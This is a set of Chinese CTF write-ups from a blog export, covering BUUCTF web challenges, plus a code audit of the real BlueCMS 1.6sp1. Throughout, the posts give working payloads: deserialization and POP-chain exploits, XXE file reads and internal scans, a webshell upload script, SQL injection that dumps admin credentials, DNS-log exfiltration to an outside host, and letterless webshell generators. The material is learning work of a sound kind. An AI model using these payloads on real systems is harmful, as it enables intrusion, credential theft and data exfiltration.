HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = \"Y-m-d h:i:s\";        $this-&gt;b = \"date\";    &#125;    public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;&#125;$c = new HelloPhp;if(isset($_GET['source']))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp = unserialize($_GET[\"data\"]);\n\n这道题，我先是用 system(ls) 去查看文件，发现不回显，又用scandir(&#39;/&#39;)，查看根目录文件，发现还是不回显，网上搜到 glob函数可用搜索文件，结果发现还是不回显，找了下原因，因为这两个函数返回的都是数组，用 echo 输出，只显示 array。我直接用file_get_contents(&#39;/flag&#39;)去根目录下读取flag，发现回显空白。我就很纳闷了，也不知道flag放在那个位置，无奈，看别人wp。用assert(phpinfo()) 输出php配置信息，flag 就在里面。\n?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;\n\n \n别人的wp基本就只有这一个思路，一点创新都没有。\n","categories":["CTF","BUUCTF"],"tags":["反序列化","CTF","代码执行"]},{"title":"BUUCTF-WEB 【NCTF2019】True XML cookbook 1","url":"/2021/04/18/%5BNCTF2019%5DTrue%20XML%20cookbook%201/","content":"考点：XXE扫内网题读取/etc/passwd\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n\n读取/flag 会报错，因为没有这个文件\nXXE扫内网\n读取 /etc/hosts  和 /proc/net/arp\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[   &lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n\n\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[   &lt;!ENTITY name SYSTEM &quot;file:///proc/net/arp&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n\n\n还真不少，用http://请求看看。\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[   &lt;!ENTITY name SYSTEM &quot;http://10.0.196.1&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n\n\n放入intruder 跑\n\n在10.0.196.11 下找到\n这道题完全是看wp做的，xxe的题做得少，只要稍微报错一点，就看不懂，xxe，外部实体注入，就是从外部引入xml格式的文件或语句到服务端执行。\n","categories":["CTF","BUUCTF"],"tags":["CTF","XXE"]},{"title":"BUUCTF-WEB [NPUCTF2020]ezinclude 1","url":"/2021/10/18/%5BNPUCTF2020%5Dezinclude%201/","content":"考点&amp;知识点md5($secret.$name)===$pass绕过\n文件包含（php://filter/string.strip_tags/resource=文件）\nphp7文件上传时Segment Fault,上传的临时文件不会被删除\n解题过程打开\n\n源代码中发现\n&lt;!--md5($secret.$name)===$pass --&gt;\n\n这段代码暗示了$secret和$name 的拼接后的字符进行md5加密后的值等于$pass。\n这里看师傅们的博客说是经典脑洞。这里的$secret就为Cookiehash的明文，如果要让上面这个条件成立。\n$name 可以为空，然后$pass传入 $secret的hash值，这个hash值就在返回头当中。\nhttp://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/?name=&amp;pass=fa25e54758d5d5c1927781a6ede89f8a\n\n\n这里返回的代码中会跳转到flflflflag.php，实际访问的时候会跳转到404.html。这里的操作只能在burp中完成。\n访问flflflflag.php\n\n从返回的代码当中，发现include($_GET[&#39;file])，推测是文件包含，对/etc/passwd包含进行尝试。\n\n验证成功，确实是文件包含，到这里有两种方式可以拿shell，一种是使用data协议，一种是包含日志文件。可惜尝试了包含日志没有回显。无奈之下，看了师傅的博客，发现还有第三种姿势，原理就是，使用php://filter/string.strip_tags/resource=文件让php陷入死循环，产生Segment Fault，如果出现Segment Fault，上传的临时文件就不会被删除，接下来就可以通过，上传一句话，然后将临时文件包含出来，getshell。这个过程需要同时完成，所有这里需要用python脚本一把梭。第三种方式这个大佬讲得更详细些\nhttps://www.cnblogs.com/R3col/p/14929237.html\n接下来直接贴脚本\nimport requestsfrom io import BytesIOurl = \"http://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"payload = \"&lt;?php eval($_POST['cmd']);?&gt;\"file_data = &#123;\"file\": BytesIO(payload.encode())&#125;res = requests.post(url=url,files=file_data, allow_redirects=False)print(res)\n\n这里可能会报错，多尝试几次就好了。页面会返回404，但是不影响，其实文件已经上传到临时目录下去了。\n这里访问dir.php，这里的文件名怎么知道的，扫目录扫出来的。这个文件的功能就是显示临时目录下的文件。\n\n这里可以发现已经上传成功。接下来通过文件包含包含出来。\n输出phpinfo\n\n从返回的代码当中就可以知道，执行成功。其实flag就藏在了输出信息当中。\n\n到这里也可以直接用蚁剑去连接，但是需要绕过disable_funcitons，不过使用蚁剑，这还不简单吗?\n总结每一题都能学到新知识点，很不错。\n","categories":["CTF","BUUCTF"],"tags":["CTF","文件包含","脑洞题"]},{"title":"BUUCTF-WEB [GYCTF2020]Easyphp 1","url":"/2021/10/29/%5BGYCTF2020%5DEasyphp%201/","content":"考点代码审计\n反序列化（pop链构造、字符串逃逸）\n前言这道题，对我来说确实比较难，看着wp都做好半天，第一个点就是找反序列化入口那，我看着serialize(new Info($age,$nickname)很茫然，不知道会返回什么结果，后门单独把这个Info类拿出来序列化，就找到头绪了，虽说以前做过这种类型的题，但是再次遇上还是摸不着头脑，还有利用点,还不清楚select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?这个语句的作用。后边再来做几遍。\n解题过程&lt;?phperror_reporting(0);session_start();//function safe($parm)&#123;//    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");//    return str_replace($array,'hacker',$parm);//&#125;class User&#123;    public $id;    public $age=null;    public $nickname=null;    public function login() &#123;        if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123;            $mysqli=new dbCtrl();            $this-&gt;id=$mysqli-&gt;login('select id,password from user where username=?');            if($this-&gt;id)&#123;                $_SESSION['id']=$this-&gt;id;                $_SESSION['login']=1;                echo \"你的ID是\".$_SESSION['id'];                echo \"你好！\".$_SESSION['token'];                echo \"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;\";                return $this-&gt;id;            &#125;        &#125;    &#125;    public function update()&#123;        // 反序列化入口        $Info=unserialize($this-&gt;getNewinfo());        $age=$Info-&gt;age;        $nickname=$Info-&gt;nickname;        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);        //这个功能还没有写完 先占坑    &#125;    public function getNewInfo()&#123;        $age=$_POST['age'];        $nickname=$_POST['nickname'];        echo safe(serialize(new Info($age,$nickname)));        return safe(serialize(new Info($age,$nickname)));    &#125;    public function __destruct()&#123;        return file_get_contents($this-&gt;nickname);//危    &#125;    public function __toString()    &#123;        // $this-&gt;nickname = Info()        $this-&gt;nickname-&gt;update($this-&gt;age);        return \"0-0\";    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct($age,$nickname)&#123;        $this-&gt;age=$age;        $this-&gt;nickname=$nickname;    &#125;    public function __call($name,$argument)&#123;        // $this-&gt;CtrlCase =        echo \"__call\";        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;&#125;Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql)&#123;        $newInfo=unserialize($newInfo);        $upDate=new dbCtrl();    &#125;    public function __destruct()    &#123;        echo \"__destruct\";        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public $hostname=\"127.0.0.1\";    public $dbuser=\"root\";    public $dbpass=\"root\";    public $database=\"test\";    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name=$_POST['username'];        $this-&gt;password=$_POST['password'];        $this-&gt;token=$_SESSION['token'];    &#125;    public function login($sql)    &#123;        echo \"login\";//        echo $sql;        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(\"连接失败，错误:\" . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result=$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param('s', $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token=='admin') &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo('用户不存在!');            return false;        &#125;        if (md5($this-&gt;password)!==$passwordResult) &#123;            echo('密码错误！');            return false;        &#125;        $_SESSION['token']=$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        //还没来得及写    &#125;&#125;// UpdateHelper::__destruct-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login-&gt;$result=$this-&gt;mysqli-&gt;prepare($sql);$u1 = new UpdateHelper();$user = new User();$info = new Info();$dbctrl = new dbCtrl();$dbctrl-&gt;password = \"1\";;$dbctrl-&gt;name =  \"admin\";$info-&gt;CtrlCase = $dbctrl;$user-&gt;age = 'select id,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?';$user-&gt;nickname = $info;$u1-&gt;sql = $user;echo serialize($u1);\n\n解题脚本&lt;?phperror_reporting(0);session_start();function safe($parm)&#123;    // 有点像字符串逃逸    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");    return str_replace($array,'hacker',$parm);&#125;class User&#123;    public $age=null;    public $nickname=null;&#125;class Info&#123;    public $CtrlCase; // 可控&#125;Class UpdateHelper&#123;    public $sql;&#125;class dbCtrl&#123;    public $password;    public $name;&#125;$u1 = new UpdateHelper();$user = new User();$user-&gt;age[0] = 'select id,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?';$info = new Info();$dbCtrl = new dbCtrl();$dbCtrl-&gt;name = \"admin\";$dbCtrl-&gt;password = \"1\";$info-&gt;CtrlCase = $dbCtrl;$user-&gt;nickname = $info;$u1-&gt;sql= $user;echo serialize($u1);// 链条：UpdateHelper::__destruct-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql)\n\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","反序列化（pop链构造、字符串逃逸）"]},{"title":"BUUCTF-WEB [RCTF2015]EasySQL 1","url":"/2021/08/16/%5BRCTF2015%5DEasySQL%201/","content":"考点二次报错注入\n解题过程打开\n两个功能，登录和注册\n先注册\n用admin作为账户名注册的时候提示，user exists! 可以知道admin账号存在，先不管，用root作为账户名注册。\n注册并登录成功\n\n点击root超链接，发现里面存在一个修改密码的功能\n\n\n接下来尝试用 admin&quot;# 的方式修改admin密码。\n流程\n第一步：先以 admin”# 为账户名注册\n\n第二步：登录 admin”# 账户\n\n第三步：修改 密码\n\n发现可以修改admin账户名的登录密码，但是并没有什么用，flag也没有藏在个人信息里，但是可以知道的是，更改密码那里存在sql注入漏洞。\n\n接下来\n通过翻开源代码可以知道，更改密码那会将错误信息输出。\n\n构造payload\n先注册页面提交\ntest&quot;||updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;password=test&amp;email=123\n\n\n登录并点开修改密码提交一次\n\n成功拿到数据库表\n拿数据库表\ntest&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#\n\n\narticle,flag,users\n拿列名\ntest&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)),0x7e),1)#\n\n\nXPATH syntax error: ‘~name,pwd,email,real_flag_1s_her’\n发现并没有获取完，学到一个新姿势。\ntest&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x7e),1)#\n\n这里如果是放在bp里提交有个小问题，&amp;&amp;后边的内容会提交不上，解决方式就是将&amp;&amp;url编码成%26%26\n\n查值\ntest&quot;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x7e),1)#\n\n\n出现问题，未显示完，用reverse函数逆序输出\ntest&quot;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;))),0x7e),1)#\n\n\npython一下\ns = &quot;~&#125;8e548f769e29-07c9-1c44-5196-67&quot;print(s[::-1])# 76-6915-44c1-9c70-92e967f845e8&#125;~\n\n拼接一下，就得到\nflag&#123;8b8f6676-6915-44c1-9c70-92e967f845e8&#125;\n\n总结这道题，凭借自己能力，只能达到修改admin用户名那一步，还是太菜，后边都是看别的师傅wp，这道题又巩固了一次二次注入的做题经验，又学到了报错注入未显示完整的内容显示出来的姿势。\n","categories":["CTF","BUUCTF"],"tags":["SQL注入","CTF","二次注入"]},{"title":"【PHP代码审计】记录对bluecms1.6sp1进行代码审计","url":"/2021/11/15/%5BPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%E8%AE%B0%E5%BD%95%E5%AF%B9bluecms1.6sp1%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"前言\n在看代码审计企业级Web代码安全架构这本书的电子版，找了个案例来进行审计，大佬们推荐bluecms v1.6 sp1这套源码来审计，在本地搭建环境，用这篇文章做记录。\n\n如何入手？在本地搭建好环境后，用phpstorm打开这套网站的文件夹，看到一堆php文件和文件夹，一下子不知如何下手？\n\n\n\n\n\n\n\n书上提供了四种代码审计的思路\n\n根据敏感关键字回溯参数传递过程\n查找可控变量，正向追踪变量传递过程\n寻找敏感功能点，通读功能点代码\n直接通读全文代码\n\n作为一个新手，当然是选择一个比较容易地方式入手啦，直接打开Seay源代码审计系统自动审计一遍。\n\n\n\n扫出255个可疑漏洞\n\n\n\n\n\n\n看到这么多可疑点，确实是又让人有些头秃，先不管这么多，先从第一个开始审计。\nSQL注入-联合注入路径\n/uploads/ad_js.php \n\n\n\n\n\n\n\n\n\n\n在19行出发现一条sql语句，其ad_id的值直接进行了拼接，接下来看看$ad_id的值是如何来的。\n\n\n\n\n\n\n\n在12行处发现$ad_id变量的值通过$_GET[‘ad_id’]拿到，并且也没有经过过滤，那么这里肯定存在sql注入漏洞，接下来进行测试。\nad_js.php?ad_id= 1 order by 8 //报错ad_js.php?ad_id= 1 order by 7 // 正常 ad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,7// 回显了7\n\n\n\n\n\n\n\n\nad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()\n\n\n\n\n\n\n\n\nad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=&apos;blue_admin&apos;\n\n\n\n\n\n\n\n\n这里报错，我传入的单引号被转义成\\&#39;了。为什么会被转义呢？我确实没有看明白，待会在分析，这里很容易绕过，直接使用表名的十六进制0x626c75655f61646d696e。\n\n\n\n\n\n\n\n成功绕过\nad_js.php?ad_id=%201%20union%20select%201,2,3,4,5,6,group_concat(admin_name,pwd) from blue_admin\n\n\n\n\n\n\n\n\n成功拿到管理员的用户名密码。\n第一个漏洞审计起来并没有那么复杂，稍微有些基础都能够利用。刚刚有一个问题并没有解决，就是在GET参数获取的时候并没有过滤和加addslashes()函数，为什么给我传入的单引号进行了转义了呢？\n经过分析\n在10行引入了一个文件\n\n\n\n\n\n\n\n进入/include/common.inc.php\n发现\n\n\n\n\n\n\n\n对所有的GET、POST、COOKIES、REQUEST都执行了deep_addslashes函数。\n而这个deep_addslashes函数的功能则是对上面这几个变量传入的值进行特殊字符转义\n\n\n\n\n\n\n\n到这就明白了刚刚为什么会被转义，审计出来的第一个联合注入漏洞。\n接下来继续\n/upload/ann.php\n\n\n\n\n\n\n\n在33行发现$cid变量进行了拼接，来到$cid拿到值的地方。\n\n\n\n\n\n\n\n可以得知，这里用了intval对拿到的值进行了整数转换，也就意味着我们无法传入sql语句，导致不可利用。\n下一个\n时间盲注&amp;dnslog的利用/uploads/comment.php\n在这个文件中找到如下几处执行sql语句的代码\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n从代码中可以看到，都是直接拼接了变量，所有的sql语句都拼接了$id这个变量，接下来回溯到$id拿到值的地方。\n\n\n\n\n\n\n\n也将拿到的值进行了整数转换。也就是后面的两条sql都无法利用，不过，我在第三天插入语句里看到了一个函数getip()，接下来跳过去看看。\nfunction getip()&#123;\tif (getenv('HTTP_CLIENT_IP'))\t&#123;\t\t$ip = getenv('HTTP_CLIENT_IP'); \t&#125;\telseif (getenv('HTTP_X_FORWARDED_FOR')) \t&#123; //获取客户端用代理服务器访问时的真实ip 地址\t\t$ip = getenv('HTTP_X_FORWARDED_FOR');\t&#125;\telseif (getenv('HTTP_X_FORWARDED')) \t&#123; \t\t$ip = getenv('HTTP_X_FORWARDED');\t&#125;\telseif (getenv('HTTP_FORWARDED_FOR'))\t&#123;\t\t$ip = getenv('HTTP_FORWARDED_FOR'); \t&#125;\telseif (getenv('HTTP_FORWARDED'))\t&#123;\t\t$ip = getenv('HTTP_FORWARDED');\t&#125;\telse\t&#123; \t\t$ip = $_SERVER['REMOTE_ADDR'];\t&#125;\treturn $ip;&#125;\n\n可以看到，插入语句里的ip字段的值是以上述方式获取，而通过上文审计可以得知，$_SERVER这个变量并没有被转义，也就是我们可以通过伪造X-Forwarded-For这个header 头来控制 ip字段的值，从而进行insert注入。\n这是代码中执行的sql语句\nINSERT INTO \".table('comment').\" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)  \t\t\tVALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '\".getip().\"', '$is_check')\n\n如果我们控制了ip字段的值，并且让字段值为&#39;or sleep(3) or&#39;\nINSERT INTO \".table('comment').\" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)  \t\t\tVALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '\"'or sleep(3) or'\"', '$is_check')\n\n测试\n\n\n\n\n\n\n\n好像并没有反应，纳闷至极，回头看看代码。\n需要三个个条件才能执行到这条sql\n\n\n\n\n\n\n\n\n\n\n$act == &#39;send&#39; 和 empty($id)，这两个变量的值可以通过$_REQUEST变量传递，empty($content)POST获得。\n\n\n\n\n\n\n\n可以明显感觉到延迟了一会，所以这里经过测试，可以检测出存在sql时间盲注。时间盲注可谓是sql注入最麻烦的注入了，肯定是需要写脚本来利用，但是其实还有另一种方式，通过dnslog，但是仅限于服务器在windows下。\n'or load_file(concat('\\\\\\\\',(select database()),'.uutiyi.ceye.io\\\\abc')) or'\n\n通过平台 http://ceye.io/records/dns\n\n\n\n\n\n\n\n数据库名直接拼接在了域名上，可谓是方便至极。\n'or load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.uutiyi.ceye.io\\\\abc')) or'\n\n这里查询表名的时候需要用limit 0,1一个一个查，但也比脚本跑要好得多了。接下来都是重复的步骤，节约时间，直接跳到最后一步。\n'or load_file(concat('\\\\\\\\',(select group_concat(admin_name,pwd) from blue_admin limit 0,1),'.uutiyi.ceye.io\\\\abc')) or'\n\n\n\n\n\n\n\n\n成功拿到管理员的用户名密码。\n前面已经审计出两个sql注入漏洞，并且在这套代码里，sql注入漏洞太多，审计过程中就忽略了类型重复的漏洞。\n继续审计。\n/uploads/guest_book.php\n\n\n\n\n\n\n\n在79行中的sql语句中，可以看到插入的值中拼接了很多变量，经过分析，这里有两个变量可控，一个是$online_ip和$content。\n跟踪$online_ip变量。\n跳转到uploads/include/common.inc.php文件中\n\n\n\n\n\n\n\n获取了getip()函数的返回值，从上文分析中，可以知道，这里的getip获得的返回值可以通过伪造X-Forwarded-For这个header 头来控制 ip字段的值。\n测试\n\n\n\n\n\n\n\n成功延迟了3秒，说明可以注入，这里就不在继续演示了，上面两次已经演示过了。\n任意文件删除在user.php 795行\n\n\n\n\n\n\n\n可以看到执行了一个unlink函数，参数直接拼接了$_POST[&#39;face_pic3&#39;]，可以直接进行任意文件删除，\n先在网页根目录创建一个文件进行测试\n\n回溯看看，执行这到这需要什么条件。\n\n\n\n\n\n\n\n需要进行登录，点击用户管理-&gt;我的个人资料-&gt;确定修改，用bp抓取这个请求\n\n\n\n\n\n\n\n将face_pic3参数修改为./1.txt 提交后即可删除刚刚创建的文件。\n后台登录宽字节注入绕过登录uploads/admin/include/common.fun.php\n在179行\nfunction check_admin($name, $pwd)&#123;\tglobal $db;\t$row = $db-&gt;getone(\"SELECT COUNT(*) AS num FROM \".table('admin').\" WHERE admin_name='$name' and pwd = md5('$pwd')\"); \tif($row['num'] &gt; 0) \t&#123; \t\treturn true; \t&#125; \telse \t&#123; \t\treturn false; \t&#125;&#125;\n\n这个是验证后台登录的函数，这里的sql语句可以看到直接拼接了$name变量。看看哪里调用了这个函数。\n回溯到 /uploads/admin/login.php\n\n\n\n\n\n\n\n32行调用了check_admin函数，传入了$admin_name和$admin_pwd变量，这两个变量通过POST接收，也并没有经过处理。那么我们直接通过后台登录页面进行传参。\nhttp://127.0.0.1:9916/uploads/admin/login.php\n\n提交\nadmin_name=admin&apos; or 1=1%23&amp;admin_pwd=admin&amp;submit=%B5%C7%C2%BC&amp;act=do_login\n\n单引号经过了转义\n\n\n\n\n\n\n\n这里可以用宽字节注入，输入&#39; 被转义成\\&#39;，用  ``%df绕过 ，%df%5c’，这里的%5c就是`，%df%5c会被解析成一个中文字符，从而照成&#39;逃逸。\n\n\n\n\n\n\n\n成功登录\n总结这套代码其实远远不止上面列出的这几个漏洞，代码中的sql语句基本上都是直接进行拼接，大部分地方都可以被利用。由此可见当年的那些网站有多不安全。这也是我第一次对整站进行审计，说说自己的感受吧，这套网站中，sql注入很多，刚开始还很耐心，后边真的懒得去看了，这套代码中有一个文件包含的洞，但是在我的环境中就是利用不了，我还以为是win10特性变了，不能在末尾追加.来绕过后缀的拼接，就在win7上复现，结果还是不行，最终也没找到原因，真是头秃，很多时候都感觉无从下手，有很多的文件，就是不知道去看哪一个，上面就是我遇到的问题。不过也学到了不少，这次审计学到的就是dnslog的利用，之前是知道，但是没有实际去做，用dnslog确实让时间盲注省事不少，但只能仅限于windows下。\n","categories":["代码审计"],"tags":["php代码审计"]},{"title":"BUUCTF-WEB 【SUCTF 2019】EasyWeb 1","url":"/2021/08/23/%5BSUCTF%202019%5DEasyWeb%201/","content":"考点无字符webshell构造\n文件上传 （.htaccess 绕过后缀检测）\nopen_basedir/disable_function绕过\n前置知识构造无字母webshell的三种方式&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123;  eval($_GET['shell']);&#125;\n\n在ctf中，我们一般遇到上面这种正则，不能传入字母和数字，是不是就不能执行webshell了呢，并不是，p神在他的博客中记录了三种方法，分别是异或、取反、自增。\n异或如果我们要构造 phpinfo POST GET system 这类关键字，我们可以通过 两个没有被过滤的字符进行异或得到。\n演示\n构造 phpinfo p:%FF^%8Fo:%FF^%90n:%FF^%91i:%FF^%96h:%FF^%97f:%FF^%99$_=%FF%FF%FF%FF%FF%FF%FF^%8F%97%8F%96%91%99%90;$_(); //$_=phpinfo;$_(); 成功执行phpinfo();在php5 可以用assert 函数 php7 不能php5 下$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);// assert$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;);\t//_POST$___=$$__; \t\t//$_POST$_($___[_]);\t//assert($_POST[_])POST _=phpinfo();\n\n\n生成脚本\npython\nimport urllib.parsefind = ['p','h','i','n','f','o']for i in range(1,256):    for j in range(1,256):        result = chr(i^j)        if(result in find):            a = i.to_bytes(1,byteorder='big')            b = j.to_bytes(1,byteorder='big')            a = urllib.parse.quote(a)            b = urllib.parse.quote(b)            print(\"%s:%s^%s\"%(result,a,b))\n\nphp\n$l = \"\";$r = \"\";$argv = str_split(\"_GET\");for ($i = 0; $i &lt; count($argv); $i++) &#123;    for ($j = 0; $j &lt; 255; $j++) &#123;        $k = chr($j) ^ chr(255); // dechex(255) = ff        if ($k == $argv[$i]) &#123;            if ($j &lt; 16) &#123;                $l .= \"%ff\";                $r .= \"%0\" . dechex($j);                continue;            &#125;            $l .= \"%ff\";            $r .= \"%\" . dechex($j);            continue;        &#125;    &#125;&#125;echo \"\\&#123;$l`$r\\&#125;\";\n\n取反参考\n与异或类似，不过它利用的是 UTF-8 编码中的某个汉子 , 将其中的某个字符提取出来 , 进行取反后得到对应字符\n生成步骤 \n\n找到 “p“ 对应的 ASCII码，拿到对应的十六进制编码 70\n\n在前面添加两个十六进制数 . 这个数是任意的 . 然后将它取反 . 在线\n比如这里用 7B，然后就行取反。\n\n\n将取反后的数字写成 NCR 格式( &amp;#x … ) , 并且将它转换为中文字符 在线\n&amp;#x848f\n\n\n\n\n带入代码测试 , 取第二个字符( 第一个字符是你任意添加的 ) , 即可得到需要的字符\n\n\n\n\n\n示范\n构建 phpinfo 进行测试\np h i n f o  对应的 十六进制编码 70 68 69 6e 66 6f\n加入 7b 取反\n原字符      十六进制         取反            转为字符 \n p             7b70                 848F            蒏\n h             7b68                  8497            蒗\ni               7b69                  8496            蒖\nn             7b6e                  8491            蒑\nf             7b66                  8499            蒙\no            7b6f                   8490            蒐\n&lt;?php$_=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //2$__='';$___=\"蒏\";$__.=~($___&#123;$_&#125;);$___=\"蒗\";$__.=~($___&#123;$_&#125;);$___=\"蒏\";$__.=~($___&#123;$_&#125;);$___=\"蒖\";$__.=~($___&#123;$_&#125;);$___=\"蒑\";$__.=~($___&#123;$_&#125;);$___=\"蒙\";$__.=~($___&#123;$_&#125;);$___=\"蒐\";$__.=~($___&#123;$_&#125;);// phpinfo();$__();p神的例子    $__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___=\"瞰\";$____.=~($___&#123;$_&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"的\";$____.=~($___&#123;$_&#125;);$___=\"半\";$____.=~($___&#123;$_&#125;);$___=\"始\";$____.=~($___&#123;$__&#125;);$_____='_';$___=\"俯\";$_____.=~($___&#123;$__&#125;);$___=\"瞰\";$_____.=~($___&#123;$__&#125;);$___=\"次\";$_____.=~($___&#123;$_&#125;);$___=\"站\";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);POST 2=phpinf();\n\n\n\n注意事项：这个写在php文件中能直接运行，通过GET传参就报错 eval()&#39;d code:1 Stack trace:，经过多次测试，需要进行url编码提交才不会报错。\n\n递增运算得到对应字符这个就直接上代码，方式不一样，目的一样。\np神案例 // ASSERT($_POST[_]); 这个仅支持 php5 php7 需要更换assert 为其他代码执行函数 &lt;?php $_=[];$_=@\"$_\"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); POST _=phpinfo();// 自己构造的命令执行  (SYSTEM)($_POST[_]); 函数自调用 需要php7.0 